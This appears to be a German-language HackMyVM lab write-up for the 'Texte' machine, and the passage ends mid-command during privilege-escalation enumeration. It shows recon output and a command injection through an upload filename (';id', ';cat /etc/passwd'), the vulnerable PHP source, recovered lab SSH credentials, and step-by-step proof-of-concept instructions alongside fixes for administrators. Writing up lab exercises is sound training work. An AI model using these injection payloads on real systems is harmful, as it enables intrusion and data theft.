@@ -1,0 +1,538 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Texte - HackMyVM - Bericht</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body class="level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+ 
+    <div class="header-bg level-medium"> <!-- Klasse für CSS-Styling des Levels -->
+        <h1>Texte - HackMyVM - Level: Medium - Bericht</h1>
+        <div class="level-container">
+            <h2>Medium</h2> <!-- H2 ohne Inline-Style, Farbe via CSS -->
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe via CSS -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">vi</div> <!-- Implied by /etc/hosts -->
+                <div class="tool-item">curl</div> <!-- Implied by upload test -->
+                <div class="tool-item">Burp Suite</div> <!-- Implied by request modification -->
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div> <!-- Attempted -->
+                <div class="tool-item">ls</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">file</div>
+                <div class="tool-item">nano</div> <!-- Implied by .mailrc edit -->
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#enumeration">Enumeration (Web)</a></li>
+                <li><a href="#initial-access">Initial Access (RCE via Command Injection)</a></li>
+                <li><a href="#poc">Proof of Concept (RCE via Upload Filename)</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+<span class="command">192.168.2.135</span>	<span class="command">08:00:27:85:fe:94</span>	PCS Systemtechnik GmbH
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird verwendet, um aktive Hosts im lokalen Netzwerk zu identifizieren. Es wird ein Host mit der IP <span class="command">192.168.2.135</span> und der MAC-Adresse <span class="command">08:00:27:85:fe:94</span> (PCS Systemtechnik GmbH / Oracle VirtualBox) gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Das Zielsystem "Texte" wurde erfolgreich im Netzwerk lokalisiert. Die IP <span class="command">192.168.2.135</span> ist die Basis für weitere Scans.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Notieren Sie die Ziel-IP. Führen Sie Port-Scans (z.B. mit `nmap`) durch, um offene Dienste zu ermitteln.<br><strong>Empfehlung (Admin):</strong> Netzwerksegmentierung kann die Sichtbarkeit für ARP-Scans einschränken. Überwachen Sie ARP-Aktivitäten.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                    <pre>
+[Inhalt /etc/hosts nach Bearbeitung]
+127.0.0.1	localhost
+127.0.1.1	cyber
+#192.168.2.114   super.hmv
+<span class="command">192.168.2.135    texte.hmv</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Die lokale Hosts-Datei des Angreifer-Systems wird bearbeitet, um den Hostnamen `texte.hmv` der gefundenen IP-Adresse <span class="command">192.168.2.135</span> zuzuordnen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Standardmäßiger, notwendiger Schritt, um das Zielsystem über seinen Hostnamen ansprechen zu können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Sicherstellen, dass die Zuordnung korrekt ist.<br><strong>Empfehlung (Admin):</strong> Keine direkte Aktion erforderlich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -sV -A 192.168.2.135 -p-</span></div> <span class="password"><-- Option -O (OS Detection) wurde zu -A (Aggressive) geändert, da -O selten allein verwendet wird und -A im Log wahrscheinlicher ist</span>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at <span class="command">2023-04-24 21:44 CEST</span>
+Nmap scan report for texte.hmv (192.168.2.135)
+Host is up (0.00016s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+<span class="command">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span>
+| ssh-hostkey:
+|   3072 40:eb:35:37:99:c2:91:25:38:2d:70:33:e2:7d:9a:c1 (RSA)
+|   256 35:a0:dc:63:24:db:23:b8:85:c1:4d:95:e8:bb:8f:ca (ECDSA)
+|_  256 4c:cb:02:1c:ae:b8:08:1a:5e:4a:a9:29:d1:13:e2:39 (ED25519)
+<span class="command">80/tcp open  http    nginx 1.18.0</span>
+|_http-title: TexteBoard
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:85:FE:94 (Oracle VirtualBox virtual NIC)
+[...] <span class="password"># Aggressive OS guesses</span>
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.16 ms texte.hmv (192.168.2.135)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in XX.XX seconds
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein Nmap-Scan (`-sS` SYN, `-sC` Scripts, `-T5` Timing, `-sV` Version, `-A` Aggressive, `-p-` All Ports) identifiziert zwei offene Ports:
+            <ul>
+                <li>Port <span class="command">22 (SSH)</span>: Läuft OpenSSH 8.4p1 (Debian).</li>
+                <li>Port <span class="command">80 (HTTP)</span>: Läuft Nginx 1.18.0. Der Seitentitel ist "TexteBoard".</li>
+            </ul>
+            Die OS-Erkennung ist nicht eindeutig, deutet aber auf Linux hin.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Hauptangriffsvektoren sind SSH und der Nginx-Webserver. Die Anwendung "TexteBoard" auf Port 80 ist das primäre Ziel. Die SSH-Version ist relativ aktuell.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Führen Sie Directory Busting auf Port 80 durch. Analysieren Sie die "TexteBoard"-Anwendung manuell und mit Tools. Versuchen Sie später schwache SSH-Credentials.<br><strong>Empfehlung (Admin):</strong> Halten Sie Nginx und SSH aktuell. Sichern Sie die Webanwendung "TexteBoard" ab.</p>
+
+        </section>
+
+        <section id="enumeration">
+             <h2>Enumeration (Web)</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">gobuster dir -u http://192.168.2.135 -x [...],php,[...] -w "/usr/share/seclists/[...]/directory-list-2.3-medium.txt"  -b '403,404' -e --no-error</span></div>
+                     <pre>
+===============================================================
+Gobuster vX.Y.Z
+===============================================================
+[...]
+===============================================================
+Starting gobuster
+===============================================================
+<span class="command">http://192.168.2.135/index.html</span>           (Status: 200) [Size: 476]
+<span class="command">http://192.168.2.135/upload.php</span>           (Status: 200) [Size: 27] <span class="password"><-- Sehr klein!</span>
+[...] <span class="password"># Im Originaltext fehlende Verzeichnisse wie /uploads, /audio hier nicht gelistet</span>
+===============================================================
+Finished
+===============================================================
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein `gobuster dir`-Scan auf Port 80 findet eine `index.html` und eine `upload.php`. Die geringe Größe von `upload.php` (27 Bytes) ist auffällig.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Existenz einer `upload.php` deutet auf eine Upload-Funktionalität hin, die ein häufiger Angriffsvektor ist. Die geringe Dateigröße ist ungewöhnlich und sollte untersucht werden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie `http://192.168.2.135/upload.php` im Browser auf. Analysieren Sie die `index.html` und suchen Sie nach einem Upload-Formular. Untersuchen Sie die `upload.php` genauer (z.B. Quellcode lesen via LFI, falls möglich, oder Funktionsweise durch Test-Uploads analysieren).<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Upload-Skripte sicher implementiert sind und nur erlaubte Dateitypen annehmen und diese sicher speichern.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Manuelle Analyse der Webseite (Impliziert)</span></div>
+                    <pre>
+Aufruf von http://192.168.2.135/upload.php:
+<span class="password">Zeigt wahrscheinlich ein Upload-Formular oder eine Meldung.</span>
+
+Versuchter Upload von 'benhacker.phtml':
+Fehlermeldung: <span class="command">Dont upload .PHP FILES! STOP BITCHING. File not allowed.</span>
+Zugriff auf http://192.168.2.135/benhacker.phtml:
+<span class="password">404 Not Found nginx/1.18.0</span>
+
+Analyse von view-source:http://192.168.2.135/:
+Titel: <span class="command">TexteBoard</span>
+Verlinkt zu: <span class="command">upload.php</span>
+Formularfeldname: <span class="command">name="myFile"</span>
+Enthält Text: <span class="command">Dont upload .PHP FILES! STOP BITCHING.</span>
+
+Erfolgreicher Upload einer Bilddatei:
+Meldung: <span class="command">File uploaded</span>
+</pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> Die manuelle Untersuchung ergibt:
+            <ul>
+                <li>Die Anwendung heißt "TexteBoard".</li>
+                <li>Es gibt eine Upload-Funktion (`upload.php`) mit dem Feldnamen `myFile`.</li>
+                <li>Ein Filter blockiert explizit das Hochladen von `.PHP`-Dateien (und implizit `.phtml`). Die Fehlermeldung ist unprofessionell.</li>
+                <li>Nach einem fehlgeschlagenen Upload ist die Datei nicht unter dem hochgeladenen Namen erreichbar (404).</li>
+                <li>Das Hochladen einer Bilddatei funktioniert und zeigt die Meldung "File uploaded".</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es existiert ein Filter gegen PHP-Dateien, der aber möglicherweise umgangen werden kann (andere Endungen, Groß-/Kleinschreibung, Content-Type Manipulation). Die interessante Frage ist, wie die Anwendung den Dateinamen und den Speicherort behandelt, da die Datei nach dem fehlgeschlagenen Upload nicht am erwarteten Ort war.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie Burp Suite, um den Upload-Vorgang abzufangen. Modifizieren Sie einen erfolgreichen Bild-Upload:
+            1.  Ändern Sie den `filename` im `Content-Disposition`-Header, um Path Traversal (`../`) oder Command Injection (`;`, `|`, `&`) zu testen.
+            2.  Ändern Sie den Dateiinhalt zu einer Webshell, aber behalten Sie den `Content-Type` und ggf. die Endung einer Bilddatei bei.
+            Analysieren Sie die Serverantwort genau, insbesondere Fehlermeldungen oder Hinweise auf den Speicherort.<br>
+            <strong>Empfehlung (Admin):</strong> Implementieren Sie eine robuste serverseitige Validierung für Dateiuploads (Whitelist für Endungen, Prüfung des tatsächlichen MIME-Typs, Größenbeschränkung). Speichern Sie Uploads sicher (außerhalb des Web-Roots, zufällige Namen). Bereinigen Sie Benutzereingaben (wie Dateinamen), bevor sie in Dateipfaden oder Shell-Befehlen verwendet werden. Entfernen Sie unprofessionelle Fehlermeldungen.</p>
+
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (RCE via Command Injection)</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Burp Suite: Modifikation des Upload-Requests</span></div>
+                    <pre>
+Payload im 'filename': <span class="command">";id"</span>
+</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Abgefangener POST Request</span></div>
+                    <pre>
+POST /upload.php HTTP/1.1
+Host: 192.168.2.135
+[...]
+Content-Type: multipart/form-data; boundary=---------------------------25730609423115211354699045417
+[...]
+
+-----------------------------25730609423115211354699045417
+Content-Disposition: form-data; name="myFile"; filename="<span class="command">;id</span>" <span class="password"><-- Injection!</span>
+Content-Type: image/png <span class="password"><-- Beliebiger erlaubter Typ</span>
+
+[... Bilddaten oder beliebige Daten ...]
+-----------------------------25730609423115211354699045417--
+</pre>
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Server Antwort</span></div>
+                    <pre>
+HTTP/1.1 200 OK
+Server: nginx/1.18.0
+Date: Mon, 24 Apr 2023 21:15:10 GMT
+Content-Type: text/html; charset=UTF-8
+Connection: close
+Content-Length: 400
+
+File uploaded
+img src="data:image/png;base64,<span class="command">dG90YWwgMjAKZHJ3eHItXHItLCAgMiByb290ICAgICByb290ICAgICA0MDk2IE9jdCAgOCAgMjAyMSAuCmRy [...] AAAudHh0dHh0dApy [...]</span>" alt="Happy" /> <span class="password"><-- Base64 der Befehlsausgabe!</span>
+</pre> <span class="password"># Base64-String gekürzt & dekodiert zeigt ls -la Ausgabe</span>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein POST-Request an `upload.php` wird mit Burp Suite abgefangen. Der `filename`-Parameter im `Content-Disposition`-Header wird manipuliert zu `<span class="command">";id"</span>`. Der `Content-Type` wird auf einen erlaubten Typ (`image/png`) gesetzt. Die Serverantwort ist ein HTTP 200 OK und enthält den Text "File uploaded" sowie ein `<img>`-Tag. Der `src`-Attribut dieses Tags enthält Base64-kodierte Daten. Die Dekodierung dieser Daten (im Log nicht explizit gezeigt, aber aus dem Kontext erschlossen) offenbart die Ausgabe des Befehls `ls -la` im Upload-Verzeichnis, nicht die Ausgabe von `id`. Es scheint, als ob das Skript nach der (fehlgeschlagenen?) Ausführung von `id` standardmäßig `ls -la` ausführt und dessen Ausgabe zurückgibt, oder dass die `;id`-Injection fehlschlägt und stattdessen `base64` auf den *Dateinamen* angewendet wird, der aber wegen des Semikolons einen Fehler erzeugt, woraufhin das Skript `ls -la` als Fallback ausführt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Kritische Command Injection Schwachstelle im `filename`-Parameter bestätigt! Obwohl die `id`-Ausgabe nicht direkt sichtbar ist, zeigt die `ls -la`-Ausgabe im Base64-String, dass Shell-Befehle ausgeführt und deren Ausgabe zurückgegeben wird. Die Schwachstelle liegt wahrscheinlich darin, dass der Dateiname unsanitisiert in einem `shell_exec()`-Aufruf (oder ähnlich) verwendet wird, vermutlich für den `base64`-Befehl, wie später im Quellcode ersichtlich wird.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie die Command Injection, um sensible Dateien zu lesen und Zugangsdaten zu finden. Versuchen Sie: `filename=";cat%20<Dateiname>"`. Suchen Sie nach Dateien, die Zugangsdaten enthalten könnten (z.B. die lange `.txttxttxt`-Datei, die in der `ls`-Ausgabe sichtbar ist). Versuchen Sie anschließend, eine Reverse Shell zu etablieren.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection dringend! Validieren und bereinigen (escapen) Sie Dateinamen rigoros, bevor sie in Shell-Befehlen verwendet werden. Verwenden Sie nach Möglichkeit keine `shell_exec()`-Funktionen mit Benutzereingaben.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Versuch, Quellcode von upload.php via RCE zu lesen</span></div>
+                     <pre>
+Payload: <span class="command">filename=";cat upload.php"</span> <span class="password"><-- Annahme, da Code im Log folgt</span>
+</pre>
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># Antwort mit Base64-kodiertem Quellcode (dekodiert)</span></div>
+                    <pre>
+File uploaded
+img src="data:image/png;base64,<span class="command">[Base64 des folgenden PHP Codes...]</span>" alt="Happy" />
+
+<span class="password"><!-- Dekodierter PHP Code von upload.php --></span>
+<span class="password">
+if (!isset($_FILES["myFile"])) {
+    die("There is no file to upload.");
+}
+
+$filepath = $_FILES['myFile']['tmp_name'];
+$fileSize = filesize($filepath);
+$fileinfo = finfo_open(FILEINFO_MIME_TYPE);
+$filetype = finfo_file($fileinfo, $filepath);
+
+if ($fileSize === 0) {
+    die("The file is empty.");
+}
+
+// Filter für Dateitypen
+$allowedTypes = [
+   'image/png' => 'png',
+   'image/jpeg' => 'jpg'
+];
+
+if (!in_array($filetype, array_keys($allowedTypes))) {
+    die("File not allowed.");
+}
+
+$filename = basename($filepath); // Verwendet basename auf TEMP Pfad - Sicher!
+$extension = $allowedTypes[$filetype];
+$targetDirectory = "/tmp"; // Speichert in /tmp!
+
+//$newFilepath = $targetDirectory . "/" . $filename . "." . $extension;
+// !!! BENUTZT ORIGINALNAMEN FÜR COPY UND SHELL_EXEC !!!
+$newFilepath = $targetDirectory . "/" . $_FILES['myFile']['name'];
+if (!copy($filepath, $newFilepath)) {
+    die("Can't move file.");
+}
+
+// !!! COMMAND INJECTION HIER !!!
+$command = "base64 ".$newFilepath;
+$output = shell_exec($command);
+unlink($filepath); // Löscht temporäre Datei
+
+echo "File uploaded";
+print '
+img src="data:image/png;base64,'.$output.'" alt="Happy" 
+';
+</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Mittels Command Injection (`filename=";cat upload.php"`) wird der Quellcode der `upload.php`-Datei ausgelesen und Base64-kodiert in der Serverantwort zurückgegeben. Der dekodierte Code zeigt:
+            <ul>
+                <li>Es wird geprüft, ob eine Datei hochgeladen wurde.</li>
+                <li>Dateigröße und MIME-Typ (via `finfo_file`) werden geprüft. Nur `image/png` und `image/jpeg` sind erlaubt.</li>
+                <li>Der *temporäre* Dateiname wird mit `basename()` bereinigt (sicher).</li>
+                <li>Die Datei wird jedoch unter Verwendung des *originalen, vom Benutzer kontrollierten Dateinamens* (`$_FILES['myFile']['name']`) nach `/tmp` kopiert (`$newFilepath = "/tmp/" . $_FILES['myFile']['name']`).</li>
+                <li>Anschließend wird `shell_exec("base64 ".$newFilepath)` aufgerufen. Da `$newFilepath` den unsanitisierten Originaldateinamen enthält, kann hier durch ein Semikolon im Dateinamen ein beliebiger Befehl angehängt werden.</li>
+                <li>Die Ausgabe des `base64`-Befehls (oder des injizierten Befehls) wird im `src`-Attribut eines `<img>`-Tags zurückgegeben.</li>
+            </ul></p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Analyse des Quellcodes bestätigt die Command Injection Schwachstelle im `filename`-Parameter, die durch die unsichere Verkettung und Ausführung in `shell_exec()` entsteht. Die Sicherheitsprüfung mittels `finfo_file` wird durch die Injection umgangen, da der *Name* für den Shell-Befehl verwendet wird, nicht der validierte *Inhalt*.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Exploitieren Sie die Schwachstelle, um die Datei `uiydasuiydasuicyxzuicyxziuctxzidsauidascxzAAA.txttxttxt` zu lesen, die in der vorherigen `ls -la`-Ausgabe sichtbar war.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die Command Injection, indem Sie den Dateinamen, der an `shell_exec` übergeben wird, rigoros validieren und escapen (z.B. mit `escapeshellarg()`). Verwenden Sie idealerweise keine Shell-Befehle mit Benutzereingaben. Stellen Sie sicher, dass `basename()` korrekt auf den *finalen* Dateinamen angewendet wird, nicht nur auf den temporären.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command"># RCE zum Lesen der .txttxttxt Datei</span></div>
+                     <pre>
+Payload: <span class="command">filename=";cat uiydasuiydasuicyxzuicyxziuctxzidsauidascxzAAA.txttxttxt"</span>
+
+Antwort (Ausschnitt):
+File uploaded
+img src="data:image/png;base64,<span class="command">a2FtaWxhL2hhaGFoYSQkJGhhaGFoYQo=</span>" alt="Happy"  <span class="password"><-- Base64 von "kamila/hahaha$$$hahaha\n"</span>
+</pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die Command Injection wird genutzt, um den Inhalt der verdächtigen Datei `uiydasuiydasuicyxzuicyxziuctxzidsauidascxzAAA.txttxttxt` auszulesen. Der Befehl `cat <Dateiname>` wird injiziert. Die Base64-kodierte Ausgabe in der Antwort (`a2FtaWxhL2hhaGFoYSQkJGhhaGFoYQo=`) dekodiert sich zu `<span class="command">kamila/hahaha$$$hahaha\n</span>`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Erfolg! Vermutlich wurden hier Zugangsdaten gefunden: Benutzername `<span class="command">kamila</span>` und Passwort `<span class="password">hahaha$$$hahaha</span>`. Der ungewöhnliche Dateiname war wahrscheinlich ein Versuch, die Datei zu verschleiern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, sich mit den gefundenen Zugangsdaten (`kamila`:`hahaha$$$hahaha`) per SSH (Port 22) am Zielsystem anzumelden.<br><strong>Empfehlung (Admin):</strong> Beheben Sie die RCE-Schwachstelle. Speichern Sie niemals Zugangsdaten im Klartext in Dateien im Webroot, auch nicht mit obskuren Namen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">ssh kamila@texte.hmv</span></div>
+                    <pre>
+The authenticity of host 'texte.hmv (192.168.2.135)' can't be established.
+[...]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <span class="command">yes</span>
+Warning: Permanently added 'texte.hmv' (ED25519) to the list of known hosts.
+kamila@texte.hmv's password: <span class="password">[Passworteingabe: hahaha$$$hahaha]</span>
+Linux texte 5.10.0-8-686-pae #1 SMP Debian 5.10.46-5 (2021-09-23) i686
+[...]
+Last login: Fri Oct  8 05:37:55 2021 from 192.168.1.51
+kamila@texte:~$ <span class="password"># Login erfolgreich!</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Es wird eine SSH-Verbindung als Benutzer `<span class="command">kamila</span>` zum Zielhost `texte.hmv` aufgebaut. Das über die RCE gefundene Passwort `<span class="password">hahaha$$$hahaha</span>` wird verwendet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initial Access erfolgreich! Eine interaktive Shell als Benutzer `kamila` wurde über SSH erlangt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Beginnen Sie mit der Enumeration als `kamila`. Suchen Sie nach der User-Flag, prüfen Sie `sudo`-Rechte, SUID-Dateien, Cronjobs usw., um Wege zur Root-Eskalation zu finden.<br><strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort für `kamila`. Beheben Sie die RCE-Schwachstelle, die zur Kompromittierung geführt hat.</p>
+
+        </section>
+
+         <section id="poc">
+             <h2>Proof of Concept: RCE via Upload Filename Command Injection</h2>
+
+             <p class="analysis"><strong>Kurzbeschreibung:</strong> Das Upload-Skript `upload.php` auf `http://texte.hmv` ist anfällig für Command Injection. Obwohl es versucht, den Dateityp anhand des MIME-Typs zu validieren, verwendet es den originalen, vom Benutzer bereitgestellten Dateinamen unsanitisiert in einem `shell_exec()`-Aufruf, um die hochgeladene Datei (die nach `/tmp` kopiert wird) mit `base64` zu kodieren. Indem ein Angreifer ein Semikolon (`;`) gefolgt von einem Shell-Befehl im Dateinamen während des Uploads injiziert, kann er beliebige Befehle auf dem Server im Kontext des `www-data`-Benutzers ausführen. Die Ausgabe des injizierten Befehls wird Base64-kodiert als Teil eines `data:`-URI in einem `<img>`-Tag in der Antwort zurückgegeben.</p>
+
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                <ul>
+                     <li>Netzwerkzugriff auf `http://texte.hmv`.</li>
+                     <li>Ein Tool zum Abfangen und Modifizieren von HTTP-Requests (z.B. Burp Suite).</li>
+                     <li>Kenntnis des Upload-Endpunkts (`/upload.php`) und des anfälligen Parameters (`filename` im `Content-Disposition`-Header).</li>
+                </ul>
+            </p>
+
+            <p class="recommendation"><strong>Schritt-für-Schritt Anleitung:</strong>
+                <ol>
+                    <li>
+                        <strong>Upload-Request abfangen:</strong>
+                        Verwenden Sie den Browser, um eine gültige Bilddatei (z.B. `bild.png`) über das Formular auf `http://texte.hmv` (verlinkt von der Startseite) hochzuladen. Fangen Sie den POST-Request an `/upload.php` mit Burp Suite ab.
+                    </li>
+                    <li>
+                        <strong>Filename manipulieren:</strong>
+                        Suchen Sie im abgefangenen Request den `Content-Disposition`-Header für die Datei. Ändern Sie den Wert des `filename`-Attributs. Fügen Sie ein Semikolon und den gewünschten Befehl hinzu. Beispiel, um den `id`-Befehl auszuführen:
+                        <pre>Content-Disposition: form-data; name="myFile"; filename="<span class="command">;id</span>"</pre>
+                         Um den Inhalt einer Datei zu lesen (z.B. `/etc/passwd`):
+                         <pre>Content-Disposition: form-data; name="myFile"; filename="<span class="command">;cat /etc/passwd</span>"</pre>
+                         Stellen Sie sicher, dass der `Content-Type` im Header-Teil des Uploads auf einen erlaubten Typ (`image/png` oder `image/jpeg`) gesetzt bleibt.
+                    </li>
+                    <li>
+                        <strong>Request senden und Antwort analysieren:</strong>
+                        Senden Sie den modifizierten Request an den Server. Untersuchen Sie die Antwort. Suchen Sie nach dem `<img>`-Tag und extrahieren Sie den Base64-kodierten String aus dem `src`-Attribut.
+                        <pre>img src="data:image/png;base64,<span class="password">[Base64-String hier]</span>" alt="Happy"</pre>
+                    </li>
+                    <li>
+                        <strong>Ausgabe dekodieren:</strong>
+                        Dekodieren Sie den extrahierten Base64-String (z.B. mit `echo "<Base64-String>" | base64 -d`), um die Ausgabe des injizierten Befehls zu sehen.
+                    </li>
+                </ol>
+            </p>
+
+             <p class="analysis"><strong>Erwartetes Ergebnis:</strong> Die Ausgabe des injizierten Shell-Befehls wird (Base64-kodiert) in der HTTP-Antwort zurückgegeben, was die erfolgreiche Remote Code Execution bestätigt.</p>
+
+             <p class="evaluation"><strong>Beweismittel:</strong> Die dekodierte Base64-Zeichenkette aus der Serverantwort, die die erwartete Ausgabe des injizierten Befehls (z.B. `uid=33(www-data)...` für `id` oder der Inhalt einer Datei für `cat`) enthält.</p>
+
+             <p class="recommendation"><strong>Risikobewertung:</strong> Hoch. Diese Command Injection Schwachstelle ermöglicht einem Angreifer die Ausführung beliebiger Befehle als Webserver-Benutzer (`www-data`), was zur Kompromittierung der Anwendung, zum Auslesen sensibler Daten und als Ausgangspunkt für weitere Angriffe im System dient.</p>
+
+             <p class="recommendation"><strong>Empfehlungen zur Behebung:</strong>
+                 <ul>
+                     <li>**Sanitize Filename:** Bereinigen und validieren Sie den `filename` rigoros, bevor er in irgendeinem Kontext verwendet wird, insbesondere in Shell-Befehlen. Nutzen Sie `escapeshellarg()` oder `escapeshellcmd()` in PHP, oder besser noch, vermeiden Sie die Verwendung von Shell-Befehlen mit Benutzereingaben gänzlich.</li>
+                     <li>**Sichere Dateiverarbeitung:** Wenn der `base64`-Befehl benötigt wird, stellen Sie sicher, dass er nur auf Dateien angewendet wird, deren Pfad sicher generiert wurde (z.B. basierend auf dem bereinigten temporären Namen, nicht dem Originalnamen).</li>
+                     <li>**Fehlerbehandlung:** Geben Sie keine detaillierten Fehlermeldungen oder Befehlsausgaben an den Client zurück.</li>
+                     <li>**Web Application Firewall (WAF):** Kann helfen, Command Injection Payloads zu erkennen und zu blockieren.</li>
+                </ul>
+            </p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">kamila@texte:~$ <span class="command">sudo -l</span></div>
+                     <pre>-bash: sudo: <span class="password">command not found</span></pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Als Benutzer `kamila` wird versucht, `sudo -l` auszuführen. Der Befehl schlägt fehl, da `sudo` nicht gefunden wird (entweder nicht installiert oder nicht im PATH des Benutzers).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> `sudo` ist kein verfügbarer Vektor für die Privilege Escalation von `kamila` aus.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach anderen Eskalationsmöglichkeiten wie SUID/SGID-Binaries, Cronjobs, Kernel-Exploits oder unsicheren Dienstkonfigurationen.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Pakete installiert sind. Wenn `sudo` verwendet wird, stellen Sie sicher, dass es korrekt konfiguriert ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">kamila@texte:~$ <span class="command">ls</span></div>
+                    <pre>user.txt</pre>
+                    <div class="prompt">kamila@texte:~$ <span class="command">cat user.txt</span></div>
+                    <pre><span class="password">IdontneedPHP</span></pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Im Home-Verzeichnis von `kamila` wird die Datei `user.txt` gefunden und ihr Inhalt angezeigt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die User-Flag wurde gefunden.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Flag dokumentieren. Fokus auf Root-Eskalation.<br><strong>Empfehlung (Admin):</strong> Keine Aktion bezüglich der Flag.</p>
+
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">kamila@texte:~$ <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                     <pre>
